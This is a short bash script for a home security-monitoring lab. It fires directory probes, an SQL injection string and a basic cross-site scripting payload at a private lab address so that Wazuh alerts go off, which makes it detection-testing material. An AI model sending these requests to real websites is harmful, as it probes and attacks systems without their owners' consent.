#!/bin/bash
# Mini SOC Lab - Web Application Attacks
# MITRE ATT&CK: T1190 - Exploit Public-Facing Application
# DISCLAIMER: For educational and lab use only.

TARGET="192.168.56.106"

echo "[*] Phase 1: Web Directory Enumeration"
curl -s -I http://$TARGET/admin
curl -s -I http://$TARGET/wp-admin
curl -s -I http://$TARGET/phpmyadmin

echo ""
echo "[*] Phase 2: SQL Injection (SQLi)"
# Payload: ?id=1' OR '1'='1 (URL encoded)
curl -s "http://$TARGET/?id=1%27%20OR%20%271%27%3D%271"

echo ""
echo "[*] Phase 3: Cross-Site Scripting (XSS)"
# Payload: <script>alert(1)</script> (URL encoded)
curl -s "http://$TARGET/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

echo ""
echo "[+] Web attacks complete. Check Wazuh Rules 31101, 31102, 31108."
